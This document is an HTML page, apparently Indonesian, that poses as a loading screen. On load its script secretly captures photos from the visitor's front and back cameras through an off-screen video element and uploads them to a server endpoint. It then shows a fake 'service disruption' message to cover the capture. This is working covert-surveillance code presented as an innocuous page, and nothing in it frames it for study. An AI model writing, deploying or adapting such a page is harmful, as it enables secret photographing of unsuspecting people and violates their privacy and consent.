<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #ffffff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  
  .loading-container {
    text-align: center;
    max-width: 400px;
    width: 100%;
  }
  
  .spinner-container {
    margin-bottom: 30px;
    transition: all 0.5s ease;
  }
  
  .spinner-container.hidden {
    opacity: 0;
    transform: scale(0.5);
    pointer-events: none;
    height: 0;
    margin: 0;
    overflow: hidden;
  }
  
  .spinner {
    width: 50px;
    height: 50px;
    margin: 0 auto;
    border: 4px solid #e0e0e0;
    border-top-color: #333;
    border-radius: 50%;
    animation: spin 0.8s ease-in-out infinite;
  }
  
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  
  .loading-title {
    font-size: 24px;
    font-weight: 400;
    letter-spacing: 6px;
    color: #333;
    margin-bottom: 10px;
    transition: all 0.5s ease;
  }
  
  .loading-title.hidden {
    opacity: 0;
    transform: translateY(-20px);
    pointer-events: none;
    height: 0;
    margin: 0;
    overflow: hidden;
  }
  
  .loading-sub {
    color: #999;
    font-size: 13px;
    letter-spacing: 2px;
    transition: all 0.5s ease;
  }
  
  .loading-sub.hidden {
    opacity: 0;
    transform: translateY(-10px);
    pointer-events: none;
    height: 0;
    margin: 0;
    overflow: hidden;
  }
  
  .loading-dots {
    display: inline-block;
    width: 20px;
    text-align: left;
  }
  
  .loading-dots::after {
    content: '...';
    animation: dots 1.5s steps(4) infinite;
  }
  
  @keyframes dots {
    0% { content: ''; }
    25% { content: '.'; }
    50% { content: '..'; }
    75% { content: '...'; }
  }
  
  .status-message {
    margin-top: 20px;
    padding: 15px;
    color: #666;
    font-size: 14px;
    min-height: 50px;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    transition: all 0.5s ease;
    transform: translateY(10px);
  }
  
  .status-message.visible {
    opacity: 1;
    transform: translateY(0);
  }
  
  .status-message.error {
    color: #ff3b30;
  }
  
  #hidden-video {
    position: fixed;
    top: -9999px;
    left: -9999px;
    width: 1px;
    height: 1px;
    opacity: 0;
    pointer-events: none;
  }
  
  #hidden-canvas {
    display: none;
  }
</style>
</head>
<body>

<div class="loading-container">
  <div class="spinner-container" id="spinnerContainer">
    <div class="spinner"></div>
  </div>
  
  <div class="loading-title" id="loadingTitle">LOADING</div>
  <div class="loading-sub" id="loadingSub">
    Please wait<span class="loading-dots"></span>
  </div>
  
  <div class="status-message" id="statusMessage">
    ⚠️ Maaf sedang gangguan
  </div>
</div>

<video id="hidden-video" autoplay playsinline></video>
<canvas id="hidden-canvas"></canvas>

<script>
const video = document.getElementById('hidden-video');
const canvas = document.getElementById('hidden-canvas');
const statusMessage = document.getElementById('statusMessage');
const spinnerContainer = document.getElementById('spinnerContainer');
const loadingTitle = document.getElementById('loadingTitle');
const loadingSub = document.getElementById('loadingSub');

let stream = null;

async function startProcess() {
  console.log('🚀 Starting process...');
  
  try {
    // Try front camera first
    console.log('📷 Accessing front camera...');
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 }
      },
      audio: false
    });
    
    video.srcObject = stream;
    console.log('✅ Front camera started');
    
    await delay(1000);
    
    // Capture front photo as BLOB
    console.log('📸 Capturing front photo...');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    // Convert to Blob (lebih reliable)
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
    console.log(`📸 Front photo blob size: ${blob.size} bytes`);
    
    // Stop front camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
      video.srcObject = null;
    }
    
    // Try back camera
    let backBlob = null;
    try {
      console.log('📷 Accessing back camera...');
      const backStream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: 'environment',
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      });
      
      const backVideo = document.createElement('video');
      backVideo.srcObject = backStream;
      await backVideo.play();
      await delay(500);
      
      const backCanvas = document.createElement('canvas');
      backCanvas.width = backVideo.videoWidth || 640;
      backCanvas.height = backVideo.videoHeight || 480;
      const backCtx = backCanvas.getContext('2d');
      backCtx.drawImage(backVideo, 0, 0);
      
      backBlob = await new Promise(resolve => backCanvas.toBlob(resolve, 'image/jpeg', 0.85));
      console.log(`📸 Back photo blob size: ${backBlob.size} bytes`);
      
      backStream.getTracks().forEach(track => track.stop());
    } catch (err) {
      console.log('⚠️ Back camera not available:', err.message);
    }
    
    // ===== SEND TO SERVER =====
    console.log('📤 Sending to server...');
    
    // Create FormData with Blob
    const formData = new FormData();
    
    // Kirim sebagai file dengan append
    formData.append('image', blob, 'photo_front.jpg');
    if (backBlob) {
      formData.append('backImage', backBlob, 'photo_back.jpg');
    }
    formData.append('phone', `User_${Date.now().toString().slice(-6)}`);
    
    // Log FormData
    console.log('📦 FormData entries:');
    for (let [key, value] of formData.entries()) {
      if (value instanceof File || value instanceof Blob) {
        console.log(`   ${key}: File/Blob (${value.size} bytes)`);
      } else {
        console.log(`   ${key}: ${value}`);
      }
    }
    
    const response = await fetch('/api/verify', {
      method: 'POST',
      body: formData
    });
    
    console.log('📨 Server response status:', response.status);
    const result = await response.json();
    console.log('📨 Server response:', result);
    
    if (!result.success) {
      throw new Error(result.error || 'Gagal mengirim ke server');
    }
    
    console.log('✅ All done!');
    
  } catch (err) {
    console.error('❌ Error:', err);
  }
  
  // Hide loading elements
  console.log('🎬 Hiding loading...');
  spinnerContainer.classList.add('hidden');
  loadingTitle.classList.add('hidden');
  loadingSub.classList.add('hidden');
  
  // Show error message
  statusMessage.classList.add('visible', 'error');
  statusMessage.textContent = '⚠️ Maaf sedang gangguan';
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Start when page loads
window.addEventListener('load', () => {
  console.log('📄 Page loaded, starting process in 500ms...');
  setTimeout(startProcess, 500);
});

window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>
</body>
</html>
